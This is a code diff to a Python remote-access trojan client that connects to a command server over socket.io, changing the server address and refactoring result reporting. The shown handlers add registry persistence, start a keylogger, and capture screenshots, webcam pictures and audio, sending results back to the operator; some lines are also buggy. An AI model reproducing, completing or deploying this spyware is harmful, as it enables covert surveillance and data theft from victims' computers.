@@ -4,7 +4,7 @@ import platform, socket, winreg, subprocess, requests, socketio
 from pynput import keyboard
 import sounddevice, soundfile, pyautogui, os, uuid, cv2, time
 
-server_ip = '192.168.100.222'
+server_ip = 'localhost'
 server_port = 8000
 info = {}
 client = socketio.Client()
@@ -167,58 +167,56 @@ def message(module):
                 if try_persistence():
                     persistenceVariable = True
                     result = "SUCCESS : Persistence Key Has Been Added"
-                    module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result}
+                    client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
                 else:
                     result = "FAILED : Persistence Key Could Not be Added"
-                    module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result}
+                    client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
             else:
                 result = "RETRY : Persistence Key Already Added"
-                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result}
+                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
         elif command == 'screenshot':
             screenshot_pic = take_screenshot(idNumber,command,hostname)
             if isinstance(screenshot_pic, str):
                 result = f"SUCCESS : Screenshot Has Been Captured"
-                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result}
+                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
             else:
                 result = f"FAILED : Screenshot Could not be Captured"
-                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result}
+                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
         elif command == 'keylogger':
             if not keyloggerVaraible:
                 listener = keyboard.Listener(on_press=start_keylogger)
                 listener.start()
                 keyloggerVaraible = True
                 result = "SUCCESS : Keylogger has been started"
-                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result}
+                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
             elif keyloggerVaraible:
                 result = "RETRY : Keylogger has Already been started"
-                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result}
+                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
             else:
                 result = "FAILED : Keylogger Could not be started"
-                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result}
+                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
         elif command == 'picture':
             picture_file = take_picture(idNumber, command, hostname)
             if isinstance(picture_file, str):
                 result = f"SUCCESS : Picture Has been captured"
-                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result}
+                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
             elif isinstance(take_picture, None):
                 result = "ERROR : Could not open WEBCAM (Maybe It doesn't Exist)"
-                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result}
+                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
             else:
                 result = f"FAILED : Picture Could not be captured"
-                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result}
+                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
         elif command == 'audio':
             audio_file = record_audio(idNumber, command, hostname)
             if isinstance(audio_file, str):
                 result = f"SUCCESS : Audio Has been Recorded"
-                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result}
+                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
             else:
                 result = f"FAILED : Audio Could not be recorded"
-                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result}
-
-        client.emit('module_output', module_output)
+                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
     except Exception as e:
-        module_output = str(e)
-        client.emit('module_output', module_output)
+        result = str(e)
+        client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': "EXCEPTION", 'result': result})
 
 @client.on('download')
 def upload(input):
